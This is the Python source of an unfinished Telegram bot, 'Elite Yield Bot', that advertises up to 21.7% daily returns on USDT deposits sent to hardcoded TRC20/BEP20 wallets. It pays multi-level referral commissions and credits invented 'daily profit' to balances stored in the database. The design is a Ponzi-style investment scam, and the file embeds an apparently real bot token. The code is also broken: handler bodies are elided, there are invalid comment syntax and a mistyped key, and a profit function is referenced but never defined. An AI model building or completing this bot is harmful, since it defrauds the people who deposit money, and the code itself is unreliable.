import telebot
from telebot.types import ReplyKeyboardMarkup, KeyboardButton, InlineKeyboardMarkup, InlineKeyboardButton
import sqlite3
import threading
import time
import logging
from datetime import datetime

logging.basicConfig(filename='bot_log.txt', level=logging.INFO, format='%(asctime)s - %(message)s')

BOT_TOKEN = '8268425583:AAFkSCeYzXAU2gcyz-tZLSwpzVg0uZ061IU'
ADMIN_ID = 7989867522
ADMIN_USERNAME = '@YourAdminUsername'

bot = telebot.TeleBot(BOT_TOKEN)

TRC20_WALLET = "TQzZgrN tG9i8mGufpvW12sxFuy"
BEP20_WALLET = "0x7485e33695b722aA071A868bb6959533a3e449b02E"

conn = sqlite3.connect('elite_yield.db', check_same_thread=False)
cursor = conn.cursor()
cursor.execute('''CREATE TABLE IF NOT EXISTS users (
    user_id INTEGER PRIMARY KEY,
    username TEXT,
    balance REAL DEFAULT 0,
    total_profit REAL DEFAULT 0,
    level TEXT DEFAULT 'Level1',
    last_profit_time INTEGER DEFAULT 0,
    referrer_id INTEGER DEFAULT NULL,
    created_at INTEGER DEFAULT 0,
    language TEXT DEFAULT 'en',
    deposit_amount REAL DEFAULT 0
)''')
cursor.execute('''CREATE TABLE IF NOT EXISTS pending_deposits (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    user_id INTEGER,
    username TEXT,
    amount REAL,
    status TEXT DEFAULT 'pending',
    created_at INTEGER
)''')
cursor.execute('''CREATE TABLE IF NOT EXISTS pending_withdraws (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    user_id INTEGER,
    username TEXT,
    amount REAL,
    wallet_address TEXT,
    status TEXT DEFAULT 'pending',
    created_at INTEGER
)''')
cursor.execute('''CREATE TABLE IF NOT EXISTS support_messages (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    user_id INTEGER,
    username TEXT,
    message_text TEXT,
    status TEXT DEFAULT 'new',
    created_at INTEGER
)''')
conn.commit()

languages = {
    'en': {
        'welcome': """🌟 Welcome to Elite Yield Bot! 🚀

Unlock up to 21.7% DAILY returns on your USDT investments! 💰

💎 Levels based on deposit:
• $10-99: 16.6%
• $100-799: 17.9%  
• $800-2399: 19.6%
• $2400-5999: 21.7%

💳 Min deposit: $10 USDT
🌐 Networks: TRC20 or BEP20

Start earning passive income today! 📈""",
        'balance_btn': 'Balance',
        ' deposit_btn': 'Deposit',
        'withdraw_btn': 'Withdraw',
        'referral_btn': 'Referral',
        'support_btn': 'Support',
        'admin_btn': 'Admin Panel',
        'support_tickets_btn': 'Support Tickets',
        'balance': """Your Balance: ${balance:.2f} USDT
Total Profit: ${total_profit:.2f} USDT
Level: {level}""",
        'deposit_instructions': """Deposit Instructions:

Send USDT to:
TRC20: `{TRC20_WALLET}`
BEP20: `{BEP20_WALLET}`

Min $10. Confirm after sending.""",
        'enter_amount': 'Enter amount (min $10):',
        'invalid_amount': 'Invalid amount!',
        'confirm_deposit': 'Confirm ${amount}',
        'withdraw_submitted': 'Withdrawal request submitted! Waiting for admin approval...',
        'referral_text': """Your Referral Link:
`{ref_link}`

Referrals: {ref_count}
Earn 10% L1, 8% L2, 3% L3 commissions!""",
        'support': 'Send your message to support:',
        'choose_language': 'Choose your language:',
        'english': 'English',
        'persian': 'Persian',
        'turkish': 'Turkish',
        'arabic': 'Arabic',
        'daily_profit': 'Daily profit added: ${profit:.2f} ({rate}% rate)!\nNew balance: ${new_balance:.2f}'
    },
    'fa': {
        'welcome': """خوش آمدید به Elite Yield Bot! 🚀

بازدهی تا 21.7% روزانه روی سرمایه USDT خود را باز کنید! 💰

سطوح بر اساس واریز:
• 10-99$: 16.6%
• 100-799$: 17.9%  
• 800-2399$: 19.6%
• 2400-5999$: 21.7%

حداقل واریز: 10$ USDT
شبکه‌ها: TRC20 یا BEP20

 درآمد غیرفعال کسب کنید! 📈""",
        'balance_btn': 'موجودی',
        'deposit_btn': 'واریز',
        'withdraw_btn': 'برداشت',
        'referral_btn': 'رفرال',
        'support_btn': 'پشتیبانی',
        'admin_btn': 'پنل ادمین',
        'support_tickets_btn': 'تیکت‌های پشتیبانی',
        # ... بقیه ترجمه
    },
    'tr': { /* مشابه en */ },
    'ar': { /* مشابه en */ }
}

def get_profit_rate(amount):
    if 2400 <= amount <= 5999: return 0.217
    if 800 <= amount <= 2399: return 0.196
    if 100 <= amount <= 799: return 0.179
    if 10 <= amount <= 99: return 0.166
    return 0

def main_menu(is_admin=False, lang='en'):
    l = languages[lang]
    markup = ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    markup.add(l['balance_btn'], l['deposit_btn'])
    markup.add(l['withdraw_btn'], l['referral_btn'])
    markup.add(l['support_btn'])
    if is_admin:
        markup.add(l['admin_btn'])
    return markup

def admin_menu(lang='en'):
    l = languages[lang]
    markup = ReplyKeyboardMarkup(resize_keyboard=True)
    markup.add('Users List', 'Pending Requests')
    markup.add('Statistics', l['support_tickets_btn'])
    markup.add('Back to Main')
    return markup

def language_menu():
    markup = InlineKeyboardMarkup(row_width=2)
    markup.add(InlineKeyboardButton(languages['en']['english'], callback_data='lang_en'))
    markup.add(InlineKeyboardButton(languages['en']['persian'], callback_data='lang_fa'))
    markup.add(InlineKeyboardButton(languages['en']['turkish'], callback_data='lang_tr'))
    markup.add(InlineKeyboardButton(languages['en']['arabic'], callback_data='lang_ar'))
    return markup

def get_user_lang(user_id):
    cursor = conn.cursor()
    try:
        cursor.execute('SELECT language FROM users WHERE user_id = ?', (user_id,))
        result = cursor.fetchone()
        conn.commit()
        return result[0] if result else 'en'
    except Exception as e:
        logging.error(f'Lang error: {e}')
        return 'en'

@bot.message_handler(commands=['start'])
def start_message(message):
    # ... (کد قبلی, با cursor = conn.cursor())

@bot.callback_query_handler(func=lambda call: call.data.startswith('lang_'))
def set_language(call):
    # ... 

@bot.message_handler(func=lambda message: True)
def handle_menu(message):
    # ... 

def process_deposit_amount(message):
    # اضافه شد!
    try:
        amount = float(message.text)
        if amount < 10:
            bot.send_message(message.chat.id, languages[get_user_lang(message.from_user.id)]['invalid_amount'])
            return
        user_id = message.from_user.id
        lang = get_user_lang(user_id)
        l = languages[lang]
        markup = InlineKeyboardMarkup()
        markup.add(InlineKeyboardButton(l['confirm_deposit'].format(amount=amount), callback_data=f'dep_confirm_{user_id}_{amount}'))
        bot.send_message(message.chat.id, f"Confirm ${amount} deposit:", reply_markup=markup)
    except Exception as e:
        logging.error(f'Deposit amount error: {e}')
        bot.send_message(message.chat.id, 'Invalid number!')

# بقیه توابع (process_withdraw_request, forward_support_to_admin, calculate_referral_commission, add_daily_profit, etc.) با cursor = conn.cursor() و try/except

if __name__ == '__main__':
    threading.Thread(target=add_daily_profit, daemon=True).start()
    print("Elite Yield Bot starting...")
    bot.polling(none_stop=True)
